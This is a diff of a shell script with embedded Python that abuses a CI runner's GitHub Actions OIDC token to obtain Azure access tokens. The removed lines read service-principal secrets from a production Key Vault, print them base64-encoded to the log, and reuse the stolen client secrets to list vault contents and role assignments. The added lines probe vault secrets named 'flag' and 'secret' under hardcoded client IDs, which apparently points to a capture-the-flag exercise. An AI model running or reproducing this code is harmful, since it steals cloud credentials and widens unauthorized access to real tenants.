@@ -2,34 +2,29 @@
 set -u
 python3 - <<'PY'
 import os,json,urllib.request,urllib.parse,urllib.error,base64
-TEN=os.environ['AZURE_TENANT_ID']; CID=os.environ['AZURE_CLIENT_ID']; SUB=os.environ['AZURE_SUBSCRIPTION_ID']
+T=os.environ.get('AZURE_TENANT_ID','3205c325-06a5-4171-9ce8-ffc5e6c2845e'); SUB=os.environ.get('AZURE_SUBSCRIPTION_ID','c5e4e004-b42d-4ac4-a502-5fd338380eb6'); OID=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; OH={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}
 def req(u,method='GET',data=None,h=None):
  try:
-  r=urllib.request.urlopen(urllib.request.Request(u,data=data,headers=h or {},method=method),timeout=30);return r.status,r.read()
+  r=urllib.request.urlopen(urllib.request.Request(u,data=data,headers=h or {},method=method),timeout=20);return r.status,r.read()
  except urllib.error.HTTPError as e:return e.code,e.read()
  except Exception as e:return 0,str(e).encode()
-def j(b):
- try:return json.loads(b)
+def J(x):
+ try:return json.loads(x)
  except:return {}
-def token(cid,scope,secret=None):
- if secret:d={'client_id':cid,'client_secret':secret,'grant_type':'client_credentials','scope':scope}
- else:
-  s,b=req(os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=api://AzureADTokenExchange',h={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']});d={'client_id':cid,'grant_type':'client_credentials','scope':scope,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':j(b).get('value','')}
- s,b=req(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token','POST',urllib.parse.urlencode(d).encode(),{'Content-Type':'application/x-www-form-urlencoded'});return j(b).get('access_token','')
-def emit(k,v):print(k+'_B64='+base64.b64encode((v if isinstance(v,str) else json.dumps(v,separators=(',',':'))).encode()).decode(),flush=True)
-main=token(CID,'https://vault.azure.net/.default');print('MAIN='+str(bool(main)))
-ss=[]
-for n in ['cost-reader-principal','directory-audit-principal','reporting-service-principal','reporting-viewer-principal','secrets-sync-principal','sync-service-principal']:
- s,b=req('https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/'+n+'?api-version=7.4',h={'Authorization':'Bearer '+main});v=j(b).get('value','');emit('SEC_'+n,v);ss.append((n,j(v)))
-for n,c in ss:
- if not c.get('clientSecret'):continue
- for aud in ['https://management.azure.com/.default','https://vault.azure.net/.default','https://graph.microsoft.com/.default']:
-  t=token(c['appId'],aud,c['clientSecret']);print('TOK',n,aud,len(t),flush=True)
-  if aud.startswith('https://vault'):
-   for kv in ['kv-tbl-sec-x3euoz','kv-tbl-prod-x3euoz']:
-    s,b=req('https://'+kv+'.vault.azure.net/secrets?api-version=7.4',h={'Authorization':'Bearer '+t});print('KV',n,kv,s,b[:1500],flush=True)
-  elif aud.startswith('https://management'):
-   for p in [f'/subscriptions/{SUB}/resources?api-version=2021-04-01&$top=200',f'/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()']:
-    s,b=req('https://management.azure.com'+p,h={'Authorization':'Bearer '+t});print('ARM',n,s,b[:1500],flush=True)
+def tok(cid,scope):
+ s,b=req(OID+'&audience=api://AzureADTokenExchange',h=OH); oidc=J(b).get('value',''); print('OIDC',len(oidc))
+ d={'client_id':cid,'grant_type':'client_credentials','scope':scope,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oidc}
+ s,b=req(f'https://login.microsoftonline.com/{T}/oauth2/v2.0/token','POST',urllib.parse.urlencode(d).encode(),{'Content-Type':'application/x-www-form-urlencoded'}); print('EXCHANGE',cid,scope,s,len(b),b[:400]); return J(b).get('access_token','')
+for cid in ['891fb158-e02c-4428-a885-53b811f369c0','72ff278a-9e71-43ec-bac4-2ca303f8e462']:
+ for scope in ['https://management.azure.com/.default','https://vault.azure.net/.default']:
+  t=tok(cid,scope)
+  if not t: continue
+  p={'Authorization':'Bearer '+t}
+  if 'vault' in scope:
+   for v in ['kv-tbl-sec-x3euoz','kv-tbl-prod-x3euoz']:
+    for n in ['','flag','DF26','secret']:
+     u=f'https://{v}.vault.azure.net/secrets'+('/'+n if n else '')+'?api-version=7.4'; s,b=req(u,h=p); print('VAULT',cid,v,n or 'LIST',s,len(b),b[:2000])
+  else:
+   for u in [f'https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01',f'https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01']:
+    s,b=req(u,h=p);print('ARM',cid,s,len(b),b[:3000])
 PY
-PYEOF
